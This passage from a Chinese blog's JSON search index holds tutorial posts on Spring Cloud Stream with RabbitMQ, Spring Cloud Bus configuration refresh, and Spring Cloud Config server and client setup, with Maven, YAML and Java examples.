原理","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud Stream消息驱动","slug":"分布式的微服务架构7","date":"2020-08-14T07:33:07.000Z","updated":"2021-04-11T17:11:28.737Z","comments":true,"path":"springcloud-stream-message-driver/","link":"","permalink":"https://kayleh.top/springcloud-stream-message-driver/","excerpt":"SpringCloud Stream消息驱动","text":"SpringCloud Stream消息驱动 消息驱动概述屏蔽底层消息中间件的差异，降低切换版本，统一消息的编程模型 Spring Cloud Stream中文指导手册 https://m.wang1314.com/doc/webapp/topic/20971999.html 设计思想标准MQ 生产者/消费者之间靠消息媒介传递信息内容:\\ Message 消息必须走特定的通道 消息通道MessageChannel 消息通道里的消息如何被消费呢，谁负责收发处理: 消息通道MessageChannel的子接口SubscribableChannel,由MessageHandler消息处理器订阅 为什么用Cloud Stream stream凭什么可以统一底层差异 Binder INPUT对应于消费者 OUTPUT对应于生产者 Stream中的消息通信方式遵循了发布-订阅模式Topic主题进行广播 在RabbitMQ就是Exchange 在kafka中就是Topic Spring Cloud Stream标准流程套路 Binder 很方便的连接中间件，屏蔽差异 Channel 通道，是队列Queue的一种抽象，在消息通讯系统中就是实现存储和转发的媒介，通过对Channel对队列进行配置 Source和Sink 简单的可理解为参照对象是Spring Cloud Stream自身，从Stream发布消息就是输出，接受消息就是输入 编码API和常用注解 案例说明RabbitMQ环境已经OK 工程中新建三个子模块 cloud-stream-rabbitmq-provider8801,作为生产者进行发消息模块 cloud-stream-rabbitmq-consumer8802,作为消息接收模块 cloud-stream-rabbitmq-consumer8803,作为消息接收模块 消息驱动之生产者新建Module cloud-stream-rabbitmq-provider8801 pom 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-starter-eureka-server --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-devtools --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yaml 123456789101112131415161718192021222324252627282930313233server: port: 8801spring: application: name: cloud-stream-provider cloud: stream: binders: # 在此处配置要绑定的rabbitmq的服务信息； defaultRabbit: # 表示定义的名称，用于于binding整合 type: rabbit # 消息组件类型 environment: # 设置rabbitmq的相关的环境配置 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # 服务的整合处理 output: # 这个名字是一个通道的名称 destination: studyExchange # 表示要使用的Exchange名称定义 content-type: application/json # 设置消息类型，本次为json，文本则设置“text/plain” binder: defaultRabbit # 设置要绑定的消息服务的具体设置eureka: client: # 客户端进行Eureka注册的配置 service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # 设置心跳的时间间隔（默认是30秒） lease-expiration-duration-in-seconds: 5 # 如果现在超过了5秒的间隔（默认是90秒） instance-id: send-8801.com # 在信息列表时显示主机名称 prefer-ip-address: true # 访问的路径变为IP地址 主启动类StreamMQMain8801 1234567891011package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplicationpublic class StreamMQMain8801 &#123; public static void main(String[] args) &#123; SpringApplication.run(StreamMQMain8801.class, args); &#125;&#125; 业务类发送消息接口 123456package com.kayleh.springcloud.service;public interface IMessageProvider&#123; public String send();&#125; 发送消息接口实现类 1234567891011121314151617package com.kayleh.springcloud.service.impl;@EnableBinding(Source.class) //定义消息的推送管道public class MessageProviderImpl implements IMessageProvider&#123; @Resource private MessageChannel output; // 消息发送管道 @Override public String send() &#123; String serial = UUID.randomUUID().toString(); output.send(MessageBuilder.withPayload(serial).build()); System.out.println(\"*****serial: \"+serial); return null; &#125;&#125; Controller 1234567891011121314151617181920package com.kayleh.springcloud.controller;import com.kayleh.springcloud.service.IMessageProvider;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;import javax.annotation.Resource;@RestControllerpublic class SendMessageController&#123; @Resource private IMessageProvider messageProvider; @GetMapping(value = \"/sendMessage\") public String sendMessage() &#123; return messageProvider.send(); &#125;&#125; 测试 启动7001eureka 启动rabbitmq: rabbitmq-plugins enable rabbitmq_management http://localhost:15672/ 启动8801 访问http://localhost:8801/sendMessage 消息驱动之消费者新建Module cloud-stream-rabbitmq-consumer8802 pom 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-starter-eureka-server --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-devtools --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yml 123456789101112131415161718192021222324252627282930313233server: port: 8802spring: application: name: cloud-stream-consumer cloud: stream: binders: # 在此处配置要绑定的rabbitmq的服务信息； defaultRabbit: # 表示定义的名称，用于于binding整合 type: rabbit # 消息组件类型 environment: # 设置rabbitmq的相关的环境配置 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # 服务的整合处理 input: # 这个名字是一个通道的名称 destination: studyExchange # 表示要使用的Exchange名称定义 content-type: application/json # 设置消息类型，本次为json，文本则设置“text/plain” binder: defaultRabbit # 设置要绑定的消息服务的具体设置eureka: client: # 客户端进行Eureka注册的配置 service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # 设置心跳的时间间隔（默认是30秒） lease-expiration-duration-in-seconds: 5 # 如果现在超过了5秒的间隔（默认是90秒） instance-id: receive-8802.com # 在信息列表时显示主机名称 prefer-ip-address: true # 访问的路径变为IP地址 主启动类StreamMQMain8802 123456789101112package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplicationpublic class StreamMQMain8802 &#123; public static void main(String[] args) &#123; SpringApplication.run(StreamMQMain8802.class, args); &#125;&#125; controller 1234567891011121314151617181920package com.kayleh.springcloud.controller;import org.springframework.cloud.stream.annotation.StreamListener;import org.springframework.messaging.Message;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.stream.annotation.EnableBinding;import org.springframework.cloud.stream.messaging.Sink;import org.springframework.stereotype.Component;@Component@EnableBinding(Sink.class)public class ReceiveMessageListenerController &#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; @StreamListener(Sink.INPUT) public void input(Message&lt;String&gt; message) &#123; System.out.println(\"消费者1号，接受：\"+message.getPayload()+\"\\t port:\"+serverPort); &#125;&#125; 测试8801发送8802接收消息 http://localhost:8801/sendMessage 分组消费与持久化依照8802，clone出来一份运行8803cloud-stream-rabbitmq-consumer8803 pom 1234567891011121314151617181920212223242526272829303132333435&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--基础配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yaml 12345678910111213141516171819202122232425262728293031323334server: port: 8803spring: application: name: cloud-stream-consumer cloud: stream: binders: # 在此处配置要绑定的rabbitmq的服务信息； defaultRabbit: # 表示定义的名称，用于于binding整合 type: rabbit # 消息组件类型 environment: # 设置rabbitmq的相关的环境配置 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # 服务的整合处理 input: # 这个名字是一个通道的名称 destination: studyExchange # 表示要使用的Exchange名称定义 content-type: application/json # 设置消息类型，本次为对象json，如果是文本则设置“text/plain” binder: defaultRabbit # 设置要绑定的消息服务的具体设置 group: kaylehAeureka: client: # 客户端进行Eureka注册的配置 service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # 设置心跳的时间间隔（默认是30秒） lease-expiration-duration-in-seconds: 5 # 如果现在超过了5秒的间隔（默认是90秒） instance-id: receive-8803.com # 在信息列表时显示主机名称 prefer-ip-address: true # 访问的路径变为IP地址 主启动类 1234567891011121314package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplicationpublic class StreamMQMain8803&#123; public static void main(String[] args) &#123; SpringApplication.run(StreamMQMain8803.class,args); &#125;&#125; 业务类 12345678910111213141516171819202122package com.kayleh.springcloud.controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.stream.annotation.EnableBinding;import org.springframework.cloud.stream.annotation.StreamListener;import org.springframework.cloud.stream.messaging.Sink;import org.springframework.messaging.Message;import org.springframework.stereotype.Component; @Component@EnableBinding(Sink.class)public class ReceiveMessageListenerController&#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; @StreamListener(Sink.INPUT) public void input(Message&lt;String&gt; message) &#123; System.out.println(\"消费者2号,-----&gt;接受到的消息: \"+message.getPayload()+\"\\t port: \"+serverPort); &#125;&#125; 启动 7001服务注册 8801消息生产 8802消息消费 8803消息消费 运行后两个问题 有重复消费问题 消息持久化问题 消费 目前是8802/8803同时都收到了，存在重复消费问题 http://localhost:8801/sendMessage 如何解决? 分组和持久化属性group 重要 生产实际案例 分组 原理 微服务应用放置于 同一个group中，就能够保证消息只会被其中一个应用消费一次。 不同的组是可以消费的，同一个组内会发生竞争关系，只有其中一个可以消费。 8802/8803都变成不同组，group两个不同 group: kaylehA、kaylehB 8802修改YML 在binder下面添加 1group: kaylehA 8803修改YML 1group: kaylehB 我们自己配置 结论 还是重复消费 8802/8803实现了轮询分组，每次只有一个消费者 8801模块的发的消息只能被8802或8803其中一个接收到，这样避免了重复消费 8802/8803都变成相同组，group两个相同 group: kaylehA 8802修改YML 1group: kaylehA 8803修改YML 1group: kaylehA 结论 同一个组的多个微服务实例，每次只会有一个拿到 持久化通过上述，解决了重复消费问题，再看看持久化 停止8802/8803并去除掉8802的分组group:kaylehA 8803的分组group:kaylehA没有去掉 8801先发送4条信息到rabbitmq 先启动8802，无分组属性配置，后台没有打出来消息 先启动8803，有分组属性配置，后台打出来了MQ上的消息","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud Bus消息总线","slug":"分布式的微服务架构6","date":"2020-08-14T07:29:28.000Z","updated":"2021-04-11T17:11:28.726Z","comments":true,"path":"springcloud-bus-message/","link":"","permalink":"https://kayleh.top/springcloud-bus-message/","excerpt":"SpringCloud Bus 消息总线","text":"SpringCloud Bus 消息总线 上一讲解的加深和扩充，一言以蔽之 分布式自动刷新配置功能 Spring Cloud Bus配合Spring Cloud Config使用可以实现配置的动态刷新 是什么？ Bus支持两种消息代理：RabbitMQ和Kafka 能干嘛？ 为何被称为总线 RabbitMQ环境配置安装Erlang，下载地址：http://erlang.org/download/otp_win64_21.3.exe 安装RabbitMQ，下载地址 https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.7.14/rabbitmq-server-3.7.14.exe 进入RabbitMQ安装目录下的sbin目录 如例我自己本机D:\\scmq\\rabbitmq_server-3.7.14\\sbin 输入以下命令启动管理功能 rabbitmq-plugins enable rabbitmq_management 可视化插件 访问地址查看是否安装成功 1http:&#x2F;&#x2F;localhost:15672&#x2F; 输入账号密码并登录: guest guest SpringCloud Bus动态刷新全局广播必须先具备良好的RabbitMQ环境先 演示广播效果，增加复杂度，再以3355为模板再制作一个3366 新建cloud-config-client-3366 pom 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; bootstrap.yml 123456789101112131415161718192021server: port: 3366spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eurekamanagement: endpoints: web: exposure: include: \"*\" 主启动类 12345678910111213package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.EnableEurekaClient;@EnableEurekaClient@SpringBootApplicationpublic class ConfigClientMain3366 &#123; public static void main(String[] args) &#123; SpringApplication.run( ConfigClientMain3366.class,args); &#125;&#125; controller 1234567891011121314151617181920212223package com.kayleh.springcloud.controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.context.config.annotation.RefreshScope;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RefreshScopepublic class ConfigClientController &#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; @Value(\"$&#123;config.info&#125;\") private String configInfo; @GetMapping(\"/configInfo\") public String getConfigInfo()&#123; return \"serverPort:\"+serverPort+\"\\t\\n\\n configInfo: \"+configInfo; &#125;&#125; 设计思想1) 利用消息总线触发一个客户端/bus/refresh,而刷新所有客户端的配置 2) 利用消息总线触发一个服务端ConfigServer的/bus/refresh端点,而刷新所有客户端的配置（更加推荐） 图二的架构显然更加合适，图一不适合的原因如下打破了微服务的职责单一性，因为微服务本身是业务模块，它本不应该承担配置刷新职责 破坏了微服务各节点的对等性 有一定的局限性。例如，微服务在迁移时，它的网络地址常常会发生变化，此时如果想要做到自动刷新，那就会增加更多的修改 给cloud-config-center-3344配置中心服务端添加消息总线支持pom 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; yml 123456789101112131415161718192021222324252627282930server: port: 3344spring: application: name: cloud-config-center cloud: config: server: git: uri: https://github.com/hhf19906/springcloud-config.git #git@github.com:hhf19906/springcloud-config.git search-paths: - springcloud-config label: masterrabbitmq: host: localhost port: 5672 username: guest password: guesteureka: client: service-url: defaultZone: http://localhost:7001/eurekamanagement: endpoints: web: exposure: include: 'bus-refresh' 给cloud-config-center-3355客户端添加消息总线支持pom 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; bootstrap.yml 12345678910111213141516171819202122232425262728server: port: 3355spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344rabbitmq: host: localhost port: 5672 username: guest password: guesteureka: client: service-url: defaultZone: http://eureka7001.com:7001/eurekamanagement: endpoints: web: exposure: include: \"*\" 给cloud-config-center-3366客户端添加消息总线支持pom 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; yml 123456789101112131415161718192021222324252627282930server: port: 3366spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344 rabbitmq: host: localhost port: 5672 username: guest password: guesteureka: client: service-url: defaultZone: http://localhost:7001/eurekamanagement: endpoints: web: exposure: include: '*' 测试 运维工程师 修改Github上配置文件增加版本号 发送Post请求 1curl -X POST \"http://localhost:3344/actuator/bus-refresh\" 配置中心 1http://config-3344.com/config-dev.yml 客户端 12http://localhost:3355/configInfohttp://localhost:3366/configInfo 获取配置信息，发现都已经刷新了 一次发送，处处生效 SpringCloud Bus动态刷新定点通知不想全部通知，只想定点通知,只通知3355, 不通知3366 简单一句话. 指定具体某一个实例生效而不是全部 公式：http://localhost:配置中心的端口号/actuator/bus-refresh/{destination} /bus/refresh请求不再发送到具体的服务实例上，而是发给config server并通过destination参数类指定需要更新配置的服务或实例 我们这里以刷新运行在3355端口上的config-client为例. 只通知3355, 不通知3366 1curl -X POST \"http://localhost:3344/actuator/bus-refresh/config-client:3355\" 通知总结All","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"SpringCloud config分布式配置中心","slug":"分布式的微服务架构5","date":"2020-08-14T07:26:05.000Z","updated":"2021-04-11T17:11:28.711Z","comments":true,"path":"springcloud-config-distributed-configuration-center/","link":"","permalink":"https://kayleh.top/springcloud-config-distributed-configuration-center/","excerpt":"SpringCloud config分布式配置中心","text":"SpringCloud config分布式配置中心 分布式系统面临的配置问题 能干嘛？集中管理配置文件 不同环境不同配置，动态化的配置更新，分环境部署比如dev/test/prod/beta/release 运行期间动态调整配置，不再需要在每个服务部署的机器上编写配置文件，服务会向配置中心统一拉取配置自己的信息 当配置发生变动时，服务不需要重启即可感知到配置的变化并应用新的配置 将配置信息以REST接口的形式暴露，post、curl访问刷新均可…. 与Github整合配置由于SpringCloud Config默认使用Git来存储配置文件（也有其它方式，比如支持svn和本地文件，但最推荐的还是Git，而且使用的是http/https访问的形式） Config服务端配置与测试1.用你自己的账号在Github上新建一个名为sprincloud-config的新Repository 2.由上一步获得刚新建的git地址，写你自己的仓库地址 3.本地硬盘上新建git仓库并clone， 本地地址：D:\\44\\SpringCloud2020 git命令 git clone xxx 4.此时在本地D盘符下D:\\44\\SpringCloud2020\\springcloud-config 表示多个环境的配置文件,保存格式必须为UTF-8,如果需要修改， 此处模拟运维人员操作git和github git add git commit -m “init yml” git push origin master 5.新建Module模块cloud-config-center-3344它既为Cloud的配置中心模块cloudConfig Center pom 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yml 1234567891011121314151617181920server: port: 3344spring: application: name: cloud-config-center cloud: config: server: git:# uri: git@github.com:Kayleh/springcloud-config.git #填写你自己的github路径 uri: https://github.com/Kayleh/springcloud-config.git #填写你自己的github路径 search-paths: - springcloud-config username: Kayleh password: #密码 label: mastereureka: client: service-url: defaultZone: http://localhost:7001/eureka 主启动类: @EnableConfigServer 12345678910111213package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.config.server.EnableConfigServer;@SpringBootApplication@EnableConfigServerpublic class ConfigCenterMain3344 &#123; public static void main(String[] args) &#123; SpringApplication.run(ConfigCenterMain3344 .class,args); &#125;&#125; windows下修改hosts文件，增加映射 1127.0.0.1 config-3344.com 测试通过Config微服务是否可以从Github上获取配置内容 启动微服务3344 http://config-3344.com:3344/master/config-dev.yml 配置读取规则 /{label}/{application}-{profile}.yml（最推荐使用这种方式） master分支 http://config-3344.com:3344/master/config-dev.yml http://config-3344.com:3344/master/config-test.yml http://config-3344.com:3344/master/config-prod.yml dev分支 http://config-3344.com:3344/dev/config-dev.yml http://config-3344.com:3344/dev/config-test.yml http://config-3344.com:3344/dev/config-prod.yml /{application}-{profile}.yml http://config-3344.com:3344/config-dev.yml http://config-3344.com:3344/config-test.yml http://config-3344.com:3344/config-prod.yml http://config-3344.com:3344/config-xxxx.yml(不存在的配置) /{application}-{profile}[/{label}] http://config-3344.com:3344/config/dev/master http://config-3344.com:3344/config/test/master http://config-3344.com:3344/config/prod/master 重要配置细节总结 成功实现了用SpringCloud Config 通过GitHub获取配置信息 Config客户端配置与测试新建cloud-config-client-3355 pom 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; bootstap.yml 是什么? 12345678910111213141516server: port: 3355spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eureka 